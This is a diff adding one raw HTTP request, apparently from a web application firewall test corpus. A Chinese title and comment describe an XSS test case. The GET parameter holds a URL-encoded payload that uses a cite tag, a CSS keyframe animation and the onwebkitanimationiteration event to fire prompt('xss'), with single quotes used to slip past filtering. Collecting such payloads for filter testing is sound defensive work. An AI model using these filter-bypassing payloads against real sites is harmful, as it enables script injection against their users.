@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_cite标签_onwebkitanimationiteration事件-06506599
+# 攻击载荷利用了HTML中的cite标签和onwebkitanimationiteration属性，触发prompt()函数，显示一个提示框。当 CSS 动画重复时触发，使用单引号绕过
+GET /?id=%3Cstyle%3E@keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3Ccite%20style=%22animation-duration:1s%3Banimation-name:slidein%3Banimation-iteration-count:2%22%20onwebkitanimationiteration=prompt%28%27xss%27%29%3E%3C%2Fcite%3E&bid=hd_tag_m8mv266h HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv266h
+RM-PRO-Token: de2289cb87353d327215d44866f661f6
+RM-PRO-Time: 1742808549948
+User-Agent: curl/7.83.1
+
